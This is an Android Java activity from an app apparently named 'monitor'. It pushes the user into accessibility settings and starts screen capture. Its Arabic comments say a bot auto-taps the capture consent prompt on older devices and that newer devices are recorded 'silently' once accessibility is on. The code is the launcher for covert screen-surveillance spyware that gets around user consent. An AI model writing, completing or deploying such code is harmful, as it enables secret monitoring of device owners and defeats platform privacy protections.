package com.tom5.monitor;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. فتح إمكانية الوصول
        if (!isAccessibilityEnabled()) {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        // 2. للأجهزة القديمة (تحت 11) نحتاج نطلب البث مرة وحدة والبوت يكبسه
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mpm.createScreenCaptureIntent(), 100);
        } else {
            // للأجهزة الحديثة، الخدمة ستصور صامت فور تفعيل الـ Accessibility
            finish();
        }
    }

    private boolean isAccessibilityEnabled() {
        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return pref != null && pref.contains(getPackageName());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 100 && resultCode == RESULT_OK) {
            Intent i = new Intent(this, ScreenService.class);
            i.putExtra("resCode", resultCode);
            i.putExtra("resData", data);
            startForegroundService(i);
            finish();
        }
    }
}
